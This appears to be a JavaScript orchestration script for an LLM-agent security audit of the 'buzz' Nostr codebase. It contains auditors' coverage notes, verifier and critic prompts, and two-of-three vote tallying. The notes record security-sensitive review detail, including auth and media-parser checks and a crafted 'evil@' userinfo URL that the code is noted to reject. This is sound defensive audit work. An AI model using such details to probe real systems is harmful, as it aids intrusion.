  "coverage_note": "Read in depth (full file): the entire relay WebSocket client and its helpers (relayClientSession.ts, relayClosedRecovery.ts, relayGateBoundary.ts, relayReconnectReplay.ts, relayRateLimitGate.ts, relayClientShared.ts, relayChannelFilters.ts, relayReconnectWaiters.ts, relayStallWatchdog.ts, relayWebSocketClose.ts, concurrency.ts, relayConnectionStateEmitter.ts, relayReconnectPolicy.ts, relayClientTimings.ts, relayClient.ts, useRelayConnection.ts, useRelayAutoHeal.ts, relayReconnectController.ts, useReconnectRelay.ts, relayQueryInvalidation.ts, relayClosedPolicy.ts, readOnlyRelayClient.ts, observerRelay.ts), plus tauri.ts, channelWindow.ts, queryClient.ts, osIdle.ts, hooks.ts, relayMembers.ts, customEmoji.ts, moderation.ts, invites.ts, deep-link.ts, lib/authors.ts, lib/url.ts, lib/maskedLink.ts, lib/mediaUrl.ts, lib/linkPreview.ts, lib/nostrUtils.ts, lib/trailingDebounce.ts, lib/trimMapToSize.ts, lib/localStorageQuota.ts, ui/VirtualizedList.tsx, and the link-rendering section of ui/markdown.tsx (~1260-1530). Cross-checked the Rust relay ingest path (ingest.rs, event.rs) and connection.rs to bound created_at drift (plus/minus 15 min) and confirm the relay sends the NIP-42 AUTH challenge only once. Skimmed/grepped remaining api/tauri* variants, features/, hooks/, layout/, theme/, most ui/ components \u2014 I did not open all 328 files; I prioritized the relay client state machine (highest blast radius, Lens C correctness). Did not deeply audit styles/, most ui/*.tsx primitives, or the ~200 tauri*/feature adapter files."
 },
 {
  "slice": "media (crates/buzz-media)",
  "files_read": 15,
  "finding_count": 6,
  "coverage_note": "Read in full: crates/buzz-media/src/validation.rs (production logic, lines 1-940; lines 941-2595 are #[cfg(test)] and I only spot-checked them), upload.rs, storage.rs, bucket_index.rs, auth.rs, upload_record.rs, thumbnail.rs, config.rs, error.rs, lib.rs, types.rs, Cargo.toml. Followed the call graph OUT of the slice: read crates/buzz-relay/src/api/media.rs lines 40-60 and 255-400 (upload entry point, video-vs-buffered routing, attribution) and 600-890 (serve/head/range/resolve_s3_key), and crates/buzz-relay/src/storage_sweep.rs in full (the only production caller of fold_bucket_listing). Also read the relevant third-party sources to confirm behaviour rather than guess: mp4-0.14.0/src/track.rs (duration/timescale arithmetic), rust-s3-0.37.2/src/bucket.rs + src/request/tokio_backend.rs (fail-on-err error mapping for get_object_stream), infer-0.19.0/src/map.rs (full extension table \u2014 I checked and ruled out a suspected multi-part-extension bug), image-0.25.10 dynimage write_to (ruled out an alpha-to-JPEG failure). Skimmed only: crates/buzz-relay/src/handlers/imeta.rs (grepped for duration cross-check at line 270) and crates/buzz-media/tests/static_creds_minio.rs. Never opened: the binary fixtures under crates/buzz-media/tests/fixtures, docs/nips/, SECURITY.md, and the rest of buzz-relay. I did not audit the blurhash or imagesize crates."
 },
 {
  "slice": "media (crates/buzz-media)",
  "files_read": 16,
  "finding_count": 6,
  "coverage_note": "Read in full: all 11 production sources in crates/buzz-media (auth.rs, bucket_index.rs, config.rs, error.rs, lib.rs, storage.rs, thumbnail.rs, types.rs, upload.rs, upload_record.rs) plus validation.rs lines 1-940 in full; I independently confirmed with an awk structural scan that validation.rs has no top-level item after the `#[cfg(test)] mod tests` at line 941 (file is 2595 lines), and I read the test bodies at 1259-1440 to see which negative cases are actually covered (the JPEG APP0 test only exercises a 6-byte payload, so the JFIF-thumbnail case is untested; there is no test for private critical PNG chunks). Cargo.toml read in full. Because the breadth pass explicitly skipped third-party consumption, I went outside the slice and read the actual dependency sources from the local cargo registry to settle whether the validators' guarantees survive the decoders: image-0.25.10 src/codecs/gif.rs and src/io/{free_functions.rs,limits.rs,image_reader_type.rs}, gif-0.14.2 src/reader/{mod.rs,converter.rs}, png-0.18.1 src/decoder/stream.rs and src/chunk.rs, zune-jpeg-0.5.15 src/decoder.rs and src/marker.rs, imagesize-0.14.0 src/formats/{gif.rs,webp.rs,jpeg.rs}, image-webp-0.2.4 src/decoder.rs (grep), and mp4-0.14.0 src/track.rs, src/mp4box/{avc1.rs,mdhd.rs,stsz.rs} plus a bounds grep over stco/co64/stts/ctts/stsc/stss/elst. On the caller side I read crates/buzz-relay/src/api/media.rs in full (upload extractor, upload_blob, get_blob/head_blob, range parsing, path validation) and the media concurrency/rate-limit defaults in crates/buzz-relay/src/config.rs lines 720-745. I did NOT open: crates/buzz-media/tests/static_creds_minio.rs, the binary fixtures under tests/fixtures, buzz-core's tenant module (normalize_host semantics assumed from its call sites), buzz-relay's relay_members / tenant::bind_community internals, buzz-relay/src/handlers/imeta.rs, or the desktop agent/team snapshot importers that consume the allowlisted PNG tEXt chunk (I only grepped them to confirm the exemption is a deliberate product feature, not a stray hole). rust-s3, blurhash, and infer were not read."
 },
 {
  "slice": "media",
  "files_read": 20,
  "finding_count": 6,
  "coverage_note": "Read in full: crates/buzz-media/src/auth.rs, upload.rs, upload_record.rs, storage.rs, thumbnail.rs, config.rs, error.rs, lib.rs, types.rs. Read validation.rs lines 1-940 (all production code) in full and spot-read 940-1262 of the test module to confirm the fixture/test boundary; validation.rs 1262-2595 I only structurally confirmed as #[cfg(test)] rather than reading line by line. Read bucket_index.rs lines 1-470 in full (classifier + fold); the remaining ~285 lines are its #[cfg(test)] module, which I did not read. Read crates/buzz-media/Cargo.toml.\n\nFollowed calls out of the slice: crates/buzz-relay/src/api/media.rs (read lines 1-908 in full \u2014 the AuthenticatedUpload extractor, upload_blob, serve/head handlers, range parsing, extract_blossom_auth); crates/buzz-relay/src/api/mod.rs (check_relay_membership / enforce_relay_membership, lines 61-195); crates/buzz-relay/src/tenant.rs (bind_community, lines 71-120); crates/buzz-core/src/tenant.rs (normalize_host, lines 121-175); crates/buzz-relay/src/state.rs (rate-limiter/in-flight map declarations, lines 580-605) and src/config.rs (media config wiring, lines 200-220 and 660-760) by targeted grep/awk rather than full read.\n\nAlso read third-party sources outside the repo to verify or refute suspected parser differentials, since the slice's safety depends on them: nostr 0.44.6 Event::verify/verify_id/Tag::kind/Tag::content (confirms id AND signature are both checked \u2014 no id/sig differential), image 0.25.10 GifDecoder + io/limits.rs, gif 0.14.2 reader MemoryLimit (default 50 MB/frame \u2014 this refutes the GIF logical-screen-vs-frame decompression-bomb path I was chasing, so I am NOT reporting it), imagesize 0.14.0 gif.rs/webp.rs, and infer 0.19.0 map.rs (confirms the uppercase \"Z\" extension behind finding 3).\n\nNever opened: crates/buzz-media/tests/static_creds_minio.rs, crates/buzz-media/tests/fixtures/** (binary), the Dart/TypeScript clients, and desktop/src-tauri/src/managed_agents/{agent_snapshot,team_snapshot}.rs \u2014 I grepped the latter to see who consumes the PNG tEXt snapshot channel that validation.rs deliberately whitelists, but did not audit that consumer, so I am not reporting on it.\n\nThings I checked and could not turn into a finding (stated so the next reviewer does not repeat them): the JPEG/PNG/WebP/GIF structural validators are bounds-tight (every slice/index is preceded by a short-circuiting length check or a checked_add(...).filter(<= len)); the MP4 box walk is depth- and count-capped; auth.rs's created_at arithmetic cannot overflow because the future-skew check runs first; nostr's Tags are the same object used for both id recomputation and policy iteration, so there is no canonicalisation differential; normalize_server_host does not strip userinfo, so \"https://evil@relay.example/\" fails closed; and the storage sidecar tenant fence is applied on every read path I traced."
 },
 {
  "slice": "relay",
  "files_read": 29,
  "finding_count": 6,
  "coverage_note": "Read in depth (opened and read substantially or fully): protocol.rs (full), connection.rs (full), handlers/auth.rs (full), handlers/event.rs (lines 1-400 and 600-1160, i.e. the fan-out gate, handle_event, ephemeral and agent-observer paths), handlers/req.rs (lines 1-500, 520-750, 746-1290 \u2014 handle_req, search, query construction, and every exported gate helper), handlers/count.rs (full), handlers/relay_admin.rs (full), handlers/imeta.rs (lines 1-359, i.e. all non-test code), api/media.rs (full non-test), api/nip05.rs (full), api/git/mod.rs (full), api/git/hook.rs (full), api/git/policy.rs (lines 1-400), api/git/transport.rs (lines 60-360, 663-1060), api/bridge.rs (lines 20-250, 380-640, 884-1330, 2060-2240), router.rs (full non-test), config.rs (lines 515-680, 790-850 \u2014 the auth/CORS/git-secret defaults). Cross-crate follow-through: buzz-core/src/kind.rs (P_GATED/AUTHOR_ONLY/RESULT_GATED/SHARED_GATED sets, is_global_only_kind's counterpart, is_relay_admin_kind, is_identity_archive_request_kind, is_relay_only_kind), buzz-core/src/filter.rs (reader_authorized_for_event, filter_match_one), buzz-db/src/event.rs (channel_id / channel_ids SQL predicates \u2014 used to prove the WS REQ p-gate skip is currently non-exploitable), buzz-media/src/upload.rs (hash verification), buzz-pubsub/src/presence.rs (set_presence), SECURITY.md, NOSTR.md, ARCHITECTURE.md. Skimmed only (grep + targeted reads, not line-by-line): handlers/ingest.rs (~600 of 4789 lines \u2014 the pre-verify prelude, channel_id derivation, scope/ban gates, imeta call site, is_global_only_kind/requires_h_channel_scope; the breadth pass had already covered the kind-specific validators), handlers/side_effects.rs (membership-notification and DM-visibility emitters only), subscription.rs (fan_out_scoped / push_match scoping invariant), api/invites.rs (authenticate + mint + claim prelude), api/operator.rs (authorize_operator_request only), buzz-db/src/event.rs query builders. Never opened: audio/* (handler, join, mesh, room, wire), api/git/{binding,cas_publish,hydrate,manifest,manifest_event,pack_cache,store}.rs, api/events.rs, api/mesh_demo.rs, api/admin/*, handlers/{command_executor,community_provisioning,close,identity_archive,moderation_authz,moderation_commands,moderation_notices,product_feedback,push_lease,report}.rs, state.rs, storage_sweep.rs, telemetry.rs, tenant.rs, tunnel/*, mesh_boot.rs, push_runtime.rs, metrics.rs, nip11.rs, workflow_sink.rs, admission.rs, invite_token.rs, webhook_secret.rs, conformance/*, examples/*, main.rs. I did NOT compile or run anything; all reachability claims are from reading call graphs."
 },
 {
  "slice": "auth (crates/buzz-auth, crates/buzz-acp) + the call sites where their auth decisions are made or re-made",
  "files_read": 31,
  "finding_count": 8,
  "coverage_note": "Read in full (line by line): all eight buzz-auth source files \u2014 lib.rs, nip42.rs, nip98.rs, nip98_replay.rs, rate_limit.rs, scope.rs, access.rs, error.rs \u2014 plus crates/buzz-auth/Cargo.toml. Read in full: crates/buzz-pubsub/src/nip98_replay.rs (the Redis implementation of the trait) and crates/buzz-acp/src/observer.rs. Read in depth the auth-relevant regions of the callers, following calls out of the slice as instructed: crates/buzz-relay/src/handlers/auth.rs (whole file), crates/buzz-relay/src/connection.rs (connection setup lines 120-260 and message dispatch / admission lines 470-680), crates/buzz-relay/src/audio/handler.rs (auth + membership path lines 150-300 and ensure_membership 1153-1215), crates/buzz-relay/src/api/bridge.rs (lines 1-220, 600-800, 880-970, 1330-1410, 2050-2100), crates/buzz-relay/src/api/operator.rs (lines 1-180), crates/buzz-relay/src/api/git/transport.rs (lines 100-300), crates/buzz-relay/src/api/mod.rs (relay_members helpers 124-180), crates/buzz-relay/src/handlers/event.rs (scope-gate region 630-712), crates/buzz-relay/src/handlers/ingest.rs (scope mapping 210-300 and the enforcement site around 1884-1904), crates/buzz-relay/src/state.rs (AppState construction 690-790), crates/buzz-relay/src/admission.rs (whole non-test body), crates/buzz-core/src/verification.rs. In buzz-acp (36k lines) I read config.rs's key-handling regions (180-260, 810-870), acp.rs's spawn/JSON-RPC transport (430-540, 1025-1090), relay.rs's NIP-42/AUTH and relay-message parsing (2350-2460, 3435-3630), lib.rs's author gate and observer-control verification (210-270, 834-900, 2100-2160, 4150-4230), pool.rs's session_new call site (890-930) and the canvas-verification contrast (2440-2520), and setup_mode.rs's header/contract (1-120); I did NOT read queue.rs, usage.rs, engram_fetch.rs, pool_lifecycle.rs, filter.rs, or the bulk of acp.rs/pool.rs/lib.rs/config.rs line-by-line \u2014 those are agent-process lifecycle, and I navigated them by targeted grep (secrets/keys, Command/env, verify_event, respond-to gates, observer) rather than exhaustive reading. Repo-wide greps were used to prove the absence claims in findings 2, 3 and the unused-helper observation (check_ip_connection / LimitType::IpConnections / check_read_access / require_scope have no production call sites anywhere under crates/). I did not open docs/nips/ or SECURITY.md."
 },
 {
  "slice": "relay",
  "files_read": 50,
  "finding_count": 4,
  "coverage_note": "Read in depth (full file or the entire security-relevant region): handlers/ingest.rs (IngestAuth + required_scope_for_kind + the whole ingest_event_inner pipeline through the per-kind validators, effective_message_author, derive_reaction_channel, kind:9007 path), handlers/auth.rs (NIP-42 end to end), handlers/relay_admin.rs, handlers/identity_archive.rs, handlers/moderation_authz.rs, handlers/count.rs, handlers/product_feedback.rs, handlers/imeta.rs (verify_imeta_blobs), invite_token.rs, webhook_secret.rs, router.rs, api/mod.rs (relay_members module in full), api/admin/auth.rs, api/admin/mod.rs, api/nip05.rs, api/events.rs, api/git/mod.rs, api/git/hook.rs, api/git/policy.rs (first 300 lines incl. HMAC + all validation), api/git/binding.rs, audio/handler.rs (auth + ensure_membership). Read the relevant halves of: api/bridge.rs (verify_bridge_auth*, check_nip98_replay, nip98/nip42 expected-URL helpers, submit_event/query_events/count_events + submit_event_authed, workflow_webhook), api/invites.rs (mint/claim/accept-policy + authenticate), api/git/transport.rs (GitAuth extractor, git_expected_url, authorize_git_read), handlers/req.rs (handle_req head, filter_to_query_params, apply_access_scope_to_query, and every gating helper from line 1040 to end), handlers/event.rs (filter_fanout_by_access + the fan-out dispatch gate), handlers/side_effects.rs (validate_standard_deletion_event, validate_admin_event head, handle_standard_deletion_event, handle_a_tag_deletion, publish_nip43_* , publish_nipia_delta, emit_group_discovery_events, effective_message_author), handlers/push_lease.rs (accept + NIP-44 decrypt), handlers/command_executor.rs (approval grant/deny + check_approver_spec), state.rs (AppState fields, disconnect_pubkey/disconnect_pubkey_clusterwide), config.rs (secrets + admin + allowlist), main.rs (relay keypair bootstrap), subscription.rs (fan_out_scoped indexing only). Followed calls out of the slice into buzz-auth (nip42.rs, nip98.rs, lib.rs), buzz-core (verification.rs, kind.rs, filter.rs), buzz-sdk (nip_oa.rs), buzz-db (event.rs channel predicate, workflow.rs approval helpers, publish_nip43_membership_locked), buzz-media (auth.rs), git-sign-nostr (enforce_conditions), and docs/nips/NIP-OA.md. Only skimmed or grepped: tunnel/*, mesh_boot.rs, audio/join.rs, audio/mesh.rs, audio/room.rs, audio/wire.rs, api/git/cas_publish.rs, api/git/hydrate.rs, api/git/store.rs, api/git/pack_cache.rs, api/git/manifest*.rs, api/media.rs (function map + auth prelude only), api/operator.rs (auth prelude only), handlers/moderation_commands.rs, handlers/report.rs, handlers/close.rs, handlers/community_provisioning.rs, connection.rs (challenge lifecycle only), storage_sweep.rs, workflow_sink.rs, push_runtime.rs. Never opened: protocol.rs, telemetry.rs, tenant.rs, metrics.rs, nip11.rs, error.rs, conformance/*, examples/*, api/mesh_demo.rs, api/admin/error.rs. I did not run the test suite or a build; all conclusions are from reading source."
 },
 {
  "slice": "auth (crates/buzz-auth, crates/buzz-acp) \u2014 Lens C, correctness",
  "files_read": 30,
  "finding_count": 9,
  "coverage_note": "Read in full: all 8 files of crates/buzz-auth (lib.rs, nip42.rs, nip98.rs, nip98_replay.rs, rate_limit.rs, scope.rs, access.rs, error.rs). Read in full outside the slice because they are the decision points that determine whether buzz-auth's contracts hold: crates/buzz-relay/src/handlers/auth.rs, crates/buzz-relay/src/admission.rs, crates/buzz-pubsub/src/nip98_replay.rs, crates/buzz-pubsub/src/rate_limiter.rs, crates/buzz-media/src/auth.rs, crates/buzz-acp/src/engram_fetch.rs. Read in relevant slices (not line-by-line whole file): crates/buzz-relay/src/api/bridge.rs (auth prelude, replay helper, expected-URL builders, /events + /query + moderation-read call sites), crates/buzz-relay/src/api/operator.rs (operator auth prelude), crates/buzz-relay/src/api/git/transport.rs (git NIP-98 gate), crates/buzz-relay/src/api/mod.rs (enforce_relay_membership / NIP-OA helpers), crates/buzz-relay/src/connection.rs (connection setup, WS admission, auth timeout), crates/buzz-relay/src/router.rs (WS door / tenant bind), crates/buzz-relay/src/state.rs (ConnectionManager, disconnect_pubkey, authenticated_pubkey registry), crates/buzz-relay/src/config.rs (rate-limit env parsing), crates/buzz-relay/src/handlers/ingest.rs (scope check site), crates/buzz-relay/src/handlers/moderation_commands.rs (live ban enforcement), crates/buzz-relay/src/audio/handler.rs (second NIP-42 verifier), crates/buzz-core/src/verification.rs and tenant.rs (normalize_host). For crates/buzz-acp I read relay.rs's auth surface in depth (sign_nip98/nip98_header/bridge_post/request_with_retry, send_auth_response, do_connect, wait_for_auth_challenge/wait_for_any_ok, mid-session AUTH handling, is_terminal_connect_error/is_terminal_auth_failure and their doc contracts, rest_client) plus lib.rs's BUZZ_AUTH_TAG paths (resolve_agent_owner, relay_auth_tag construction) and engram_fetch.rs in full. I never opened crates/buzz-acp/src/acp.rs, pool.rs, queue.rs, config.rs, usage.rs, observer.rs, pool_lifecycle.rs, setup_mode.rs, filter.rs, main.rs, or base_prompt.md \u2014 ~28k lines of agent-subprocess lifecycle code that grep confirms contains no buzz-auth call and no NIP-42/98 verification; I grepped them for auth_tag, nip98, challenge, unbounded_channel, std::sync::Mutex instead of reading them. I did not open crates/buzz-relay/src/handlers/req.rs, count.rs, event.rs, or side_effects.rs beyond targeted greps, so claims about read-path enforcement after auth are limited to what the grep hits showed."
 }
]
const ROOT = 'buzz'

const VERDICT_SCHEMA = {
  type: 'object',
  additionalProperties: false,
  required: ['verdicts'],
  properties: {
    verdicts: {
      type: 'array',
      items: {
        type: 'object',
        additionalProperties: false,
        required: ['id', 'refuted', 'reasoning', 'corrected_severity'],
        properties: {
          id: { type: 'string' },
          refuted: { type: 'boolean' },
          reasoning: {
            type: 'string',
            description: 'If refuted: the specific thing the finding got wrong. If confirmed: the concrete reachable path, file:line at each hop.',
          },
          corrected_severity: { enum: ['critical', 'high', 'medium', 'low', 'none'] },
          reachable_path: {
            type: 'string',
            description: 'Only when confirming: entry point -> ... -> failure, cited by file:line. Leave empty when refuting.',
          },
        },
      },
    },
  },
}

const GAP_SCHEMA = {
  type: 'object',
  additionalProperties: false,
  required: ['gaps'],
  properties: {
    gaps: {
      type: 'array',
      items: {
        type: 'object',
        additionalProperties: false,
        required: ['gap', 'why_it_matters', 'concrete_followup', 'priority'],
        properties: {
          gap: { type: 'string', description: 'What the audit failed to examine' },
          why_it_matters: { type: 'string' },
          concrete_followup: { type: 'string', description: 'The specific next action that would close it' },
          priority: { enum: ['high', 'medium', 'low'] },
        },
      },
    },
  },
}

function refutePrompt(batch, lens) {
  const items = batch.map((f) => `---
**${f.id}** - \`${f.file}:${f.line}\` [claimed ${f.severity}, reporter confidence ${f.confidence}, category ${f.category}]
Claim: ${f.claim}
Failure scenario: ${f.failure_scenario}
Evidence the reporter quoted:
\`\`\`
${f.evidence}
\`\`\``).join('\n')

  return `You are a skeptical security reviewer working on \`buzz\`, a Nostr client, relay, and agent platform in Rust, TypeScript, and Dart. The repo is at \`${ROOT}/\` relative to your working directory; a finding that cites \`crates/foo/src/bar.rs\` is at \`${ROOT}/crates/foo/src/bar.rs\`.

**Your job is to REFUTE the claims below.** Each was produced by another language model reading code quickly. They may be wrong, may describe unreachable code, may misread the logic entirely, or may describe a real pattern that is already defended somewhere the reporter did not look.

${items}
---

For each claim: open the cited file, read the surrounding code AND the callers, and determine whether the described failure can actually occur in a shipped build.

${lens.text}

**Default to \`refuted: true\` when uncertain.** This advisory will be published about someone else's project; a false finding is far more damaging than a missed one. Confirming requires you to state the concrete reachable path from an attacker-controlled entry point to the failure, citing file:line at each hop, in \`reachable_path\`. **If you cannot state that path, refute.** "It looks dangerous" is not confirmation.

Set \`corrected_severity\` to what you believe the real severity is - it is fine to confirm a finding but downgrade it, and that is often the right answer. Use \`none\` when refuting.

Return a verdict for every id listed. Return ONLY the structured object.`
}

function criticPrompt(confirmed, refuted, i) {
  const angles = [
    'Focus on SLICES AND FILES: which parts of the codebase got thin treatment relative to their size and risk, and which confirmed findings rest on files nobody read carefully.',
    'Focus on VULNERABILITY CLASSES: which whole categories of defect did no lens in this audit go looking for, given what this system actually does.',
    'Focus on THE PROJECT\'S OWN EVIDENCE: read what the test suites in `' + ROOT + '/desktop/tests`, `' + ROOT + '/mobile/test`, and the crates\' `tests/` directories actually defend against, plus `' + ROOT + '/SECURITY.md` and `' + ROOT + '/docs/nips/`. What does the project treat as a threat that this audit never examined - and what is both untested and unaudited?',
  ]

  return `You are the completeness critic for a security audit of the \`buzz\` codebase (Nostr client, relay, and agent platform in Rust, TypeScript, and Dart, at \`${ROOT}/\`). **You are not looking for bugs. You are looking for what the audit failed to examine.**

The audit ran a breadth sweep over 17 slices covering 2,904 of 3,435 tracked files, then 3-lens depth dives (hostile input / crypto and identity / correctness) on 9 risk slices, then refute-by-default verification.

**Coverage each auditor reported (slice, phase, files actually opened, and its own account of what it skipped):**
\`\`\`json
${JSON.stringify(COVERAGE, null, 1)}
\`\`\`

**Findings that survived verification (${confirmed.length}):**
${confirmed.length ? confirmed.map((f) => `- ${f.file}:${f.line} [${f.final_severity}] ${f.claim}`).join('\n') : '(none)'}

**Findings that were refuted and dropped (${refuted.length}):** ${refuted.length ? refuted.slice(0, 30).map((f) => `${f.file}:${f.line}`).join(', ') : '(none)'}

**Static analysis that ran:** \`cargo audit\` (4 vulnerabilities, all quick-xml DoS advisories, plus 6 warnings), \`cargo clippy\` (clean on default lints across the whole workspace; 795 hits only after enabling indexing_slicing / arithmetic_side_effects / cast_possible_truncation / unwrap_used), \`pnpm audit --prod\` (1 moderate: markdown-it quadratic DoS), \`semgrep --config auto\` (146 hits, but its rule coverage for Rust is essentially nil and for Dart is zero).

**Explicitly not audited:** \`desktop/tests\` (149 files), \`mobile/test\` (97), \`benchmarks/\` (40), \`docs/\` (41), \`examples/\` (10), icons and static assets.

${angles[i]}

Answer concretely, naming files and slices rather than generalities:
- Which slices returned suspiciously little relative to their size and risk?
- What *class* of vulnerability did no lens look for?
- Which confirmed findings rest on a file no agent fully read?
- What did the four-language split (Rust / TypeScript / Dart / shell+YAML) cause us to under-cover?
- Where did static analysis give us no ground truth at all, so the result rests on model reading alone?

Read the codebase as needed to check your claims - do not speculate about what is in a file you can open. Return a prioritised list of coverage gaps, each with a concrete follow-up action. Return ONLY the structured object.`
}

// Phase 3: every batch verified by 3 lenses concurrently.
const verdictSets = await parallel(
  BATCHES.flatMap((b, bi) =>
    LENSES.map((l) => () =>
      agent(refutePrompt(b, l), {
        label: `verify:b${bi + 1}:${l.key}`,
        phase: 'Verify',
        model: 'fable',
        effort: 'high',
        schema: VERDICT_SCHEMA,
      }).then((r) => ({ lens: l.key, batch: bi, verdicts: (r && r.verdicts) || [] })),
    ),
  ),
)

const ok = verdictSets.filter(Boolean)
const byId = {}
for (const set of ok) {
  for (const v of set.verdicts) {
    ;(byId[v.id] ||= []).push({ ...v, lens: set.lens })
  }
}

const ALL = BATCHES.flat()
const SEV = { critical: 4, high: 3, medium: 2, low: 1, none: 0 }
const confirmed = []
const refuted = []

for (const f of ALL) {
  const votes = byId[f.id] || []
  const keeps = votes.filter((v) => !v.refuted)
  // A finding survives only if at least 2 verifiers decline to refute it.
  // Zero votes (all three verifiers failed) counts as refuted, not as a pass.
  const rec = {
    ...f,
    votes: votes.map((v) => ({ lens: v.lens, refuted: v.refuted, reasoning: v.reasoning, severity: v.corrected_severity })),
    vote_count: votes.length,
    keep_votes: keeps.length,
  }
  if (keeps.length >= 2) {
    // Severity is the MEDIAN of the confirming verdicts, not the reporter's claim.
    const sevs = keeps.map((v) => SEV[v.corrected_severity] ?? 0).sort((a, b) => a - b)
    const med = sevs[Math.floor(sevs.length / 2)]
    rec.final_severity = Object.keys(SEV).find((k) => SEV[k] === med) || 'low'
    rec.reachable_paths = keeps.map((v) => v.reachable_path).filter(Boolean)
    confirmed.push(rec)
  } else {
    refuted.push(rec)
  }
}

log(`${ALL.length} verified: ${confirmed.length} survived 2-of-3, ${refuted.length} refuted`)

const gapSets = await parallel(
  [0, 1, 2].map((i) => () =>
    agent(criticPrompt(confirmed, refuted, i), {
      label: `critic:${['slices', 'classes', 'project-evidence'][i]}`,
      phase: 'Critic',
      model: 'fable',
      effort: 'high',
      schema: GAP_SCHEMA,
    }),
  ),
)

const gaps = gapSets.filter(Boolean).flatMap((g) => g.gaps || [])
log(`${gaps.length} coverage gaps named`)

return { confirmed, refuted, gaps, verified_count: ALL.length }
